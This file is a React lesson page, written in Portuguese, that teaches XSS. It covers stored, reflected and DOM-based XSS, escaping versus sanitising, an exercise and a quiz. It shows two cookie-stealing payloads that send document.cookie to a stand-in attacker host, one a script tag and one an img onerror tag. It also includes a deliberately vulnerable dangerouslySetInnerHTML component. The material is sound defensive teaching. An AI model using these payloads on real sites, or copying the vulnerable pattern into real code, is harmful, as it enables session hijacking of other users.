import { LessonBody } from "@/components/aprenda/lesson-body";
import { CodeExample } from "@/components/aprenda/code-example";
import { Compare } from "@/components/aprenda/compare";
import { Exercise } from "@/components/aprenda/exercise";
import { Callout } from "@/components/aprenda/callout";
import { Quiz } from "@/components/aprenda/quiz";
import type { LessonMeta } from "@/content/aprenda/types";

export const meta: LessonMeta = {
  slug: "07-xss-cross-site-scripting",
  title: "XSS: quando o input de alguém vira código rodando na tela de outra pessoa",
  summary: "Um campo de comentário sem sanitização não é um problema visual — é uma porta pra rodar JavaScript arbitrário na sessão de outra pessoa.",
  estimatedMinutes: 18,
  level: "fundamentos",
};

export default function Licao07XssCrossSiteScripting() {
  return (
    <LessonBody>
      <p>
        XSS (Cross-Site Scripting) acontece quando um input controlado por um usuário é renderizado na página sem
        tratamento, e o navegador de <strong>outra pessoa</strong> acaba executando esse conteúdo como se fosse
        código legítimo do site. O nome é meio enganoso — não precisa de "outro site" nenhum envolvido; o ataque
        inteiro pode acontecer dentro do mesmo domínio, só explorando um campo que ninguém pensou em tratar como
        entrada potencialmente hostil.
      </p>

      <h2>O cenário clássico: um campo de comentário</h2>
      <p>
        Imagine um campo de comentário num blog, sem nenhum tratamento no texto antes de salvar ou exibir. Um
        atacante não precisa de acesso especial nenhum — só precisa preencher o campo como qualquer visitante:
      </p>
      <CodeExample
        label="o que o atacante digita no campo de comentário"
        language="html"
        code={`Ótimo post! <script>fetch('https://atacante.com/roubo?c=' + document.cookie)</script>`}
      />
      <p>
        Se esse texto for salvo cru e depois renderizado sem escapar, o navegador de <strong>qualquer pessoa</strong>{" "}
        que abrir a página do post executa esse <code>&lt;script&gt;</code> como se fosse parte legítima da página —
        porque, do ponto de vista do navegador, ele <em>é</em> parte da página. Note a conexão direta com a lição 3:
        se o cookie de sessão daquela vítima não tiver <code>HttpOnly</code>, esse script rouba a sessão inteira sem
        precisar adivinhar senha nenhuma.
      </p>

      <h2>Os 3 tipos — focando no que mais aparece</h2>
      <p>
        <strong>XSS armazenado</strong> (o exemplo acima) é o mais grave: o script malicioso fica salvo no banco de
        dados e é servido pra <strong>qualquer</strong> visitante daquela página, indefinidamente, até alguém
        remover o dado ou corrigir a renderização. <strong>XSS refletido</strong> depende de a vítima clicar num link
        malicioso especialmente montado (o script vem embutido na própria URL, geralmente num parâmetro de busca
        ecoado de volta na página) — funciona só uma vez, pra quem clicou naquele link específico.{" "}
        <strong>XSS baseado em DOM</strong> acontece inteiramente no navegador, quando JavaScript do próprio site lê
        algo controlável pelo atacante (a URL, por exemplo) e insere isso no HTML da página sem passar pelo servidor
        nenhuma vez. Os três têm a mesma raiz — dado não confiável virando HTML/JS executável — mudando só{" "}
        <strong>onde</strong> e <strong>por quanto tempo</strong> o script fica ativo.
      </p>

      <h2>Renderizar cru vs. escapar — a diferença de uma função</h2>
      <Compare
        badLabel="Renderização vulnerável"
        goodLabel="Renderização segura"
        bad={
          <CodeExample
            language="jsx"
            code={`function Comentario({ texto }) {
  // "texto" veio direto do banco, sem tratamento
  return <div dangerouslySetInnerHTML={{ __html: texto }} />;
}
// <script> dentro de "texto" é interpretado e EXECUTADO pelo navegador`}
          />
        }
        good={
          <CodeExample
            language="jsx"
            code={`function Comentario({ texto }) {
  // renderização normal do React já escapa qualquer HTML no texto
  return <div>{texto}</div>;
}
// "<script>" vira texto literal na tela, nunca é executado`}
          />
        }
      />
      <p>
        O detalhe importante: React (e a maioria dos frameworks modernos) já escapa conteúdo dinâmico{" "}
        <strong>por padrão</strong> quando renderizado normalmente — a vulnerabilidade só entra quando alguém usa
        deliberadamente uma via de escape como <code>dangerouslySetInnerHTML</code> (o próprio nome já é um aviso)
        pra inserir HTML bruto, geralmente achando que precisa disso pra permitir formatação rica no texto do
        usuário.
      </p>

      <h2>Por que sanitizar, não só "escapar tudo"</h2>
      <p>
        Escapar tudo resolve a maioria dos casos, mas quebra qualquer funcionalidade legítima que precise de HTML
        controlado (um editor de texto rico, por exemplo, onde negrito e links precisam continuar sendo HTML de
        verdade). Pra esses casos, a resposta não é "escapar tudo" nem "confiar em tudo" — é{" "}
        <strong>sanitizar</strong>: passar o HTML por uma biblioteca que remove especificamente tags e atributos
        perigosos (<code>&lt;script&gt;</code>, <code>onerror=</code>, <code>javascript:</code> em hrefs) mantendo o
        resto intacto.
      </p>

      <Exercise
        prompt={
          <p>
            Um perfil de usuário permite um campo "bio" com HTML básico (negrito, itálico, link), renderizado com{" "}
            <code>dangerouslySetInnerHTML</code>. Um atacante preenche a bio com{" "}
            <code>{`<img src="x" onerror="fetch('https://atacante.com/'+document.cookie)">`}</code>. Por que isso
            funciona mesmo sem nenhuma tag <code>&lt;script&gt;</code> no texto, e o que resolveria sem remover a
            formatação legítima de negrito/itálico/link?
          </p>
        }
        solutionLanguage="plaintext"
        solutionCode={`Funciona porque XSS não depende especificamente da tag <script> —
qualquer atributo que aceita JavaScript (como "onerror", disparado
quando a imagem falha ao carregar, o que é garantido já que "x" não
é uma URL de imagem válida) serve igualmente bem pro atacante.
Filtrar só a palavra "<script>" do texto não resolveria nada aqui.

A solução correta é sanitizar o HTML com uma biblioteca dedicada
(ex.: DOMPurify) configurada com uma lista branca de tags e
atributos permitidos (b, i, a com href, mas SEM atributos "on*" e
sem "img"). Isso preserva negrito/itálico/link legítimos e remove
especificamente o que permite executar código, em vez de tentar
adivinhar todos os jeitos possíveis de injetar script.`}
      />

      <Callout href="/padrao-frontend/seguranca/xss">
        A defesa contra XSS usada em produção pelo padrão — incluindo onde escapar e onde sanitizar — está
        documentada no Padrão Frontend.
      </Callout>
      <Callout href="/padrao-frontend/seguranca/sanitizacao-de-inputs">
        Os casos em que sanitização (em vez de escape simples) é necessária, e as bibliotecas usadas pelo padrão,
        estão documentados no Padrão Frontend.
      </Callout>

      <Quiz
        track="seguranca"
        lessonSlug={meta.slug}
        questions={[
          {
            question:
              "Por que um XSS armazenado (salvo no banco de dados) é considerado mais grave que um XSS refletido?",
            options: [
              "Porque XSS armazenado só afeta o navegador de quem escreveu o conteúdo malicioso, nunca terceiros",
              "Porque XSS refletido não pode ser corrigido, enquanto o armazenado pode",
              "Porque o script armazenado é servido a qualquer visitante da página, indefinidamente, enquanto o refletido depende de uma vítima clicar num link malicioso específico",
              "Porque XSS armazenado só ocorre em aplicações que não usam HTTPS",
            ],
            correctIndex: 2,
          },
          {
            question:
              "No exemplo com <img src=\"x\" onerror=\"...\">, por que filtrar apenas a palavra 'script' do texto do usuário não teria evitado o ataque?",
            options: [
              "Porque XSS não depende especificamente da tag <script> — qualquer atributo que executa JavaScript (como onerror) serve igualmente ao ataque",
              "Porque o navegador ignora completamente qualquer filtro de texto aplicado no lado do servidor",
              "Porque a tag <img> é sempre bloqueada por padrão pelos navegadores modernos, tornando o filtro desnecessário",
              "Porque HTTPS já impediria esse tipo específico de ataque antes mesmo de chegar na renderização",
            ],
            correctIndex: 0,
          },
        ]}
      />
    </LessonBody>
  );
}
